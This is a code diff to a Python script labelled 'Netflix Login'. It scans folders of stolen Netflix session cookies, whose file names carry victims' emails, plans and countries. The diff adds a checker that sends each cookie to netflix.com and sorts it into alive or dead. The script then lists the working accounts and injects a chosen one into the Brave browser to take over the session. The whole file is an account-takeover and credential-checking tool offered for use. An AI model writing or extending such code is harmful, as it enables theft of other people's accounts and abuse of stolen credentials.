@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
-import os, sys, glob, shutil, json
+import os, sys, glob, shutil, json, time, requests
+from colorama import init, Fore, Style
+
+init(autoreset=True)
 
 COOKIES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-password')
 OUTPUT_FILE = os.path.expanduser('~/netflix_current.txt')
@@ -17,20 +20,18 @@ BANNER = '''
                                             ░ ░
                        Netflix Login'''
 
-FILES_CACHE = None
+HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 
-def find_cookies(force=False):
-    global FILES_CACHE
-    if FILES_CACHE and not force:
-        return FILES_CACHE
+
+def find_cookies():
     files = []
     for root, dirs, fs in os.walk(COOKIES_DIR):
         if root.endswith('good_cookies'):
             for f in sorted(fs):
                 if f.endswith('.txt'):
                     files.append(os.path.join(root, f))
-    FILES_CACHE = files
     return files
+
 
 def parse_meta(path):
     name = os.path.basename(path).replace('.txt', '')
@@ -39,6 +40,7 @@ def parse_meta(path):
     plan = p[0].lstrip('[') if p else '?'
     country = p[-2] if len(p) >= 2 else '?'
     return email, plan, country
+
 
 def extract_ids(path):
     nfid = snfid = None
@@ -53,6 +55,25 @@ def extract_ids(path):
                     elif parts[5] == 'SecureNetflixId':
                         snfid = parts[6]
     return nfid, snfid
+
+
+def check_cookie(nfid, snfid):
+    s = requests.Session()
+    s.cookies.set('NetflixId', nfid, domain='.netflix.com')
+    if snfid:
+        s.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')
+    try:
+        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=15)
+        if r.status_code != 200 or 'login' in r.url.lower():
+            return 'DEAD'
+        if 'newPassword' in r.text and 'currentPassword' not in r.text:
+            return 'GOOD'
+        elif 'newPassword' in r.text and 'currentPassword' in r.text:
+            return 'BAD'
+        return 'UNKNOWN'
+    except:
+        return 'ERROR'
+
 
 def open_brave(cookies):
     import subprocess, time
@@ -75,6 +96,7 @@ def open_brave(cookies):
         page.context.add_cookies(cookies)
         page.goto('https://www.netflix.com/browse')
 
+
 def build_alive_cookies(path):
     nfid, snfid = extract_ids(path)
     if not nfid:
@@ -86,18 +108,46 @@ def build_alive_cookies(path):
          'path': '/', 'secure': True, 'httpOnly': True, 'sameSite': 'Lax'},
     ]
 
+
 def main():
     print(BANNER)
     files = find_cookies()
     if not files:
-        print('\n  ❌ No good_cookies found.')
+        print(Fore.RED + '\n  ❌ No good_cookies found.' + Style.RESET_ALL)
         sys.exit(1)
 
-    print(f'\n  Found {len(files)} accounts\n')
+    print(Fore.CYAN + f'\n  🔍 Scanning {len(files)} cookies...' + Style.RESET_ALL)
+    time.sleep(0.5)
 
-    for i, f in enumerate(files):
+    alive = []
+    for i, fpath in enumerate(files):
+        email, plan, country = parse_meta(fpath)
+        nfid, snfid = extract_ids(fpath)
+        label = f'{email or os.path.basename(fpath):40s} | {plan:15s} | {country}'
+
+        status = check_cookie(nfid, snfid) if nfid else 'NO_ID'
+
+        if status == 'GOOD':
+            alive.append(fpath)
+            print(Fore.GREEN + f'  ✅ #{len(alive):>2} GOOD  | {label}' + Style.RESET_ALL, flush=True)
+        elif status == 'BAD':
+            print(Fore.RED + f'     BAD   | {label}' + Style.RESET_ALL)
+        elif status == 'DEAD':
+            print(Fore.YELLOW + f'     DEAD  | {label}' + Style.RESET_ALL)
+        else:
+            print(Fore.RED + f'     {status:5s} | {label}' + Style.RESET_ALL)
+
+        time.sleep(0.15)
+
+    if not alive:
+        print(Fore.RED + '\n  ❌ No alive accounts found.' + Style.RESET_ALL)
+        sys.exit(1)
+
+    print(Fore.CYAN + f'\n  ✅ {len(alive)} alive accounts\n' + Style.RESET_ALL)
+
+    for i, f in enumerate(alive):
         email, plan, country = parse_meta(f)
-        print(f'  {i+1:>2}. {email:35s} | {plan:15s} | {country}')
+        print(Fore.WHITE + f'  {i+1:>2}. {email:35s} | {plan:15s} | {country}' + Style.RESET_ALL)
 
     open_flag = '--open' in sys.argv or '-o' in sys.argv
     idx = -1
@@ -118,11 +168,11 @@ def main():
         except:
             pass
 
-    if idx < 0 or idx >= len(files):
-        print('  ❌ Invalid selection')
+    if idx < 0 or idx >= len(alive):
+        print(Fore.RED + '  ❌ Invalid selection' + Style.RESET_ALL)
         sys.exit(1)
 
-    selected = files[idx]
+    selected = alive[idx]
     email, plan, country = parse_meta(selected)
     shutil.copy2(selected, OUTPUT_FILE)
 
@@ -142,6 +192,7 @@ def main():
             open_brave(cookies)
     else:
         print('\n  💡 Use --open N to launch in Brave automatically')
+
 
 if __name__ == '__main__':
     main()
